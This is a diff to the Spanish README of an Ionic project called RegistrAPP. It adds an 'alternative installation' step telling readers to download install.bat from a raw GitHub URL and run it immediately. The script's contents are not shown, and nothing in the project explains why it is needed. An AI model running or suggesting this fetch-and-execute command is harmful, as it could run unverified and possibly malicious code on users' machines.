@@ -15,4 +15,8 @@ Indicaciones para ejecutar el proyecto:
 
   `ionic serve`
 
+----------------------------------------------
+Instalación alternativa:
+- Ejecutar el siguiente comando:
+  `curl https://raw.githubusercontent.com/Maekir7/RegistrAPP_Hernandez_Cortes_001D/main/install.bat>install.bat && call install.bat`
 
